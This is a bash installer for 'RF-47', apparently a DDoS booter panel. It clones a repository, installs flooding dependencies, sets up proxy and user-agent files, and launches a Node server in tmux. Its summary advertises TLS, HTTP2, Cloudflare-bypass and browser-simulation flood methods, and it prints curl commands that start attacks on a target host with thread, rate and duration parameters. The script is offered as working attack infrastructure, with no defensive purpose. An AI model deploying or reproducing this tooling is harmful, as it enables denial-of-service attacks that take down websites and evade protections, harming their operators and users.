#!/bin/bash

RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m'

echo -e "${GREEN}========================================${NC}"
echo -e "${GREEN}       RF-47 Network Setup Script       ${NC}"
echo -e "${GREEN}              Version 3.0                ${NC}"
echo -e "${GREEN}========================================${NC}"

# ==================== UPDATE SYSTEM ====================
echo -e "${YELLOW}[1/12] Updating system packages...${NC}"
apt update -y && apt upgrade -y

# ==================== INSTALL DEPENDENCIES ====================
echo -e "${YELLOW}[2/12] Installing Node.js and npm...${NC}"
apt install nodejs npm -y

echo -e "${YELLOW}[3/12] Installing tmux...${NC}"
apt install tmux -y

echo -e "${YELLOW}[4/12] Installing git...${NC}"
apt install git -y

echo -e "${YELLOW}[5/12] Installing wget and curl...${NC}"
apt install wget curl -y

# ==================== CHECK NODE VERSION ====================
echo -e "${YELLOW}[6/12] Checking Node.js version...${NC}"
NODE_VERSION=$(node -v)
echo -e "${GREEN}Node.js version: ${NODE_VERSION}${NC}"

# ==================== CLONE FROM GITHUB ====================
echo -e "${YELLOW}[7/12] Cloning from GitHub...${NC}"

# Backup existing directory
if [ -d "this-is-a-hub-nah" ]; then
    echo -e "${YELLOW}Directory this-is-a-hub-nah already exists, updating...${NC}"
    cd this-is-a-hub-nah
    git pull
    cd ..
else
    echo -e "${YELLOW}Cloning repository...${NC}"
    git clone https://github.com/raflyprasetya/this-is-a-hub-nah.git
fi

if [ ! -d "this-is-a-hub-nah" ]; then
    echo -e "${RED}Failed to clone repository from GitHub!${NC}"
    exit 1
fi

echo -e "${GREEN}Clone completed!${NC}"

# ==================== NAVIGATE TO DIRECTORY ====================
cd this-is-a-hub-nah

# ==================== CREATE SCRIPTS DIRECTORY ====================
echo -e "${YELLOW}[8/12] Creating scripts directory...${NC}"
mkdir -p scripts

# ==================== CLEAN NODE_MODULES (if exists) ====================
if [ -d "node_modules" ]; then
    echo -e "${YELLOW}Removing old node_modules...${NC}"
    rm -rf node_modules package-lock.json
fi

# ==================== INSTALL NPM PACKAGES ====================
echo -e "${YELLOW}[9/12] Installing npm dependencies...${NC}"

# Install all required dependencies
npm install express randomstring user-agents axios commander hpack request --silent

if [ $? -ne 0 ]; then
    echo -e "${RED}Failed to install npm dependencies!${NC}"
    echo -e "${YELLOW}Retrying with force...${NC}"
    npm install express randomstring user-agents axios commander hpack request --force
fi

# Verify installations
echo -e "${YELLOW}Verifying installations...${NC}"
if npm list express randomstring user-agents axios commander hpack request --depth=0 &>/dev/null; then
    echo -e "${GREEN}All dependencies installed successfully!${NC}"
else
    echo -e "${RED}Some dependencies may be missing. Installing one by one...${NC}"
    npm install express
    npm install randomstring
    npm install user-agents
    npm install axios
    npm install commander
    npm install hpack
    npm install request
fi

echo -e "${GREEN}NPM dependencies installed!${NC}"

# ==================== CREATE DEFAULT FILES ====================
echo -e "${YELLOW}[10/12] Creating default configuration files...${NC}"

# Create empty proxy.txt if not exists
if [ ! -f "scripts/proxy.txt" ]; then
    touch scripts/proxy.txt
    echo -e "${GREEN}Created empty proxy.txt${NC}"
else
    echo -e "${GREEN}proxy.txt already exists${NC}"
fi

# Create default ua.txt if not exists
if [ ! -f "scripts/ua.txt" ]; then
    cat > scripts/ua.txt << 'EOF'
Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/112.0
Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36
Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36
Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36
Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1
Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36
Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36
Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:108.0) Gecko/20100101 Firefox/108.0
Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36
Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36
EOF
    echo -e "${GREEN}Created default ua.txt with 10 user-agents${NC}"
else
    echo -e "${GREEN}ua.txt already exists${NC}"
fi

# ==================== CONFIGURE SERVER (ONLY DOMAIN) ====================
echo -e ""
echo -e "${GREEN}========================================${NC}"
echo -e "${YELLOW}       Server Configuration             ${NC}"
echo -e "${GREEN}========================================${NC}"
echo -e ""

read -p "Enter your server domain (example: api.rf47.com): " SERVER_DOMAIN

if [ -z "$SERVER_DOMAIN" ]; then
    SERVER_DOMAIN="localhost"
    echo -e "${YELLOW}No input detected, using default: ${SERVER_DOMAIN}${NC}"
else
    echo -e "${GREEN}Using server domain: ${SERVER_DOMAIN}${NC}"
fi

# ==================== DEFAULT VALUES (NO QUESTIONS) ====================
GAS_URL="https://script.google.com/macros/s/AKfycbxavnz3eaPAy3CwIUsM4bsv3JFhhi4rwGCT3f1VDKoLl7MjaA9_jj7YrKfGeIvjgSLRsA/exec"
PING_ENABLED="true"
SERVER_PORT="3000"

echo -e "${GREEN}Using default GAS URL${NC}"
echo -e "${GREEN}Auto ping enabled: ${PING_ENABLED}${NC}"

# ==================== SAVE CONFIGURATION ====================
echo -e ""
echo -e "${GREEN}========================================${NC}"
echo -e "${YELLOW}       Saving Configuration            ${NC}"
echo -e "${GREEN}========================================${NC}"

cat > config.json << EOF
{
    "server_domain": "${SERVER_DOMAIN}",
    "server_port": ${SERVER_PORT},
    "ping_enabled": ${PING_ENABLED},
    "ping_interval": 30000,
    "gas_url": "${GAS_URL}"
}
EOF

echo -e "${GREEN}Configuration saved to config.json${NC}"

# ==================== CHECK SCRIPT FILES ====================
echo -e ""
echo -e "${YELLOW}Checking script files...${NC}"

if [ -f "server.js" ]; then
    echo -e "${GREEN}✓ server.js found${NC}"
else
    echo -e "${RED}✗ server.js not found!${NC}"
    exit 1
fi

if [ -f "scripts/TLS.js" ]; then
    echo -e "${GREEN}✓ scripts/TLS.js found${NC}"
else
    echo -e "${YELLOW}⚠ scripts/TLS.js not found (optional)${NC}"
fi

if [ -f "scripts/TLSV2.js" ]; then
    echo -e "${GREEN}✓ scripts/TLSV2.js found${NC}"
else
    echo -e "${YELLOW}⚠ scripts/TLSV2.js not found (optional)${NC}"
fi

if [ -f "scripts/CF-BYPASS.js" ]; then
    echo -e "${GREEN}✓ scripts/CF-BYPASS.js found${NC}"
else
    echo -e "${YELLOW}⚠ scripts/CF-BYPASS.js not found (optional)${NC}"
fi

if [ -f "scripts/Browser.js" ]; then
    echo -e "${GREEN}✓ scripts/Browser.js found${NC}"
else
    echo -e "${YELLOW}⚠ scripts/Browser.js not found (optional)${NC}"
fi

# ==================== START SERVER WITH TMUX ====================
echo -e ""
echo -e "${YELLOW}[11/12] Starting server with tmux...${NC}"

# Kill existing tmux session if any
tmux kill-session -t rf47 2>/dev/null

# Start new tmux session
tmux new-session -d -s rf47 "node server.js"

if [ $? -eq 0 ]; then
    echo -e "${GREEN}Server started in tmux session: rf47${NC}"
else
    echo -e "${RED}Failed to start server!${NC}"
    exit 1
fi

# ==================== DISPLAY SUMMARY ====================
echo -e ""
echo -e "${GREEN}========================================${NC}"
echo -e "${GREEN}       Setup Completed Successfully!     ${NC}"
echo -e "${GREEN}========================================${NC}"
echo -e ""
echo -e "${BLUE}Configuration:${NC}"
echo -e "  ${YELLOW}Server Domain:${NC} ${SERVER_DOMAIN}"
echo -e "  ${YELLOW}Server Port:${NC} ${SERVER_PORT}"
echo -e "  ${YELLOW}Ping Enabled:${NC} ${PING_ENABLED} (auto)"
echo -e "  ${YELLOW}Ping Interval:${NC} 30 seconds"
echo -e "  ${YELLOW}Ping URL:${NC} https://${SERVER_DOMAIN}"
echo -e "  ${YELLOW}GAS URL:${NC} ${GAS_URL} (default)"
echo -e ""
echo -e "${BLUE}Available Methods:${NC}"
echo -e "  ${GREEN}● tls${NC}     - TCP/TLS Flood via HTTP/HTTPS/SOCKS proxy"
echo -e "  ${GREEN}● tlsv2${NC}   - HTTP2 Flood with stable auto-reconnect"
echo -e "  ${GREEN}● cf${NC}      - Cloudflare Bypass HTTP2 Flood"
echo -e "  ${GREEN}● fast${NC}    - H2-FAST Advanced HTTP2 Flood with AI Fingerprint"
echo -e "  ${GREEN}● browser${NC} - Browser Engine - Real browser simulation"
echo -e ""
echo -e "${BLUE}Commands:${NC}"
echo -e "  ${YELLOW}tmux attach -t rf47${NC}       - Attach to server session"
echo -e "  ${YELLOW}tmux detach${NC}               - Detach (Ctrl+B then D)"
echo -e "  ${YELLOW}tmux kill-session -t rf47${NC} - Stop the server"
echo -e "  ${YELLOW}cat config.json${NC}           - View configuration"
echo -e "  ${YELLOW}npm list --depth=0${NC}        - List installed packages"
echo -e ""
echo -e "${BLUE}API Examples:${NC}"
echo -e "  ${YELLOW}# TLS Method${NC}"
echo -e "  curl \"http://localhost:3000/api?api_key=rfpromax1337&ip=example.com&method=tls&port=443&time=30&threads=50\""
echo -e ""
echo -e "  ${YELLOW}# TLSV2 Method${NC}"
echo -e "  curl \"http://localhost:3000/api?api_key=rfpromax1337&ip=example.com&method=tlsv2&port=443&time=30&threads=10\""
echo -e ""
echo -e "  ${YELLOW}# CF Method${NC}"
echo -e "  curl \"http://localhost:3000/api?api_key=rfpromax1337&ip=example.com&method=cf&port=443&time=30&threads=10\""
echo -e ""
echo -e "  ${YELLOW}# FAST Method${NC}"
echo -e "  curl \"http://localhost:3000/api?api_key=rfpromax1337&ip=example.com&method=fast&port=443&time=30&threads=10&rate=100&connections=10&streams=10&fingerprint=true&extra=true\""
echo -e ""
echo -e "  ${YELLOW}# BROWSER Method${NC}"
echo -e "  curl \"http://localhost:3000/api?api_key=rfpromax1337&ip=example.com&method=browser&port=443&time=30&threads=10&browser_count=5&conn_timeout=30000&rps=10\""
echo -e ""
echo -e "${GREEN}========================================${NC}"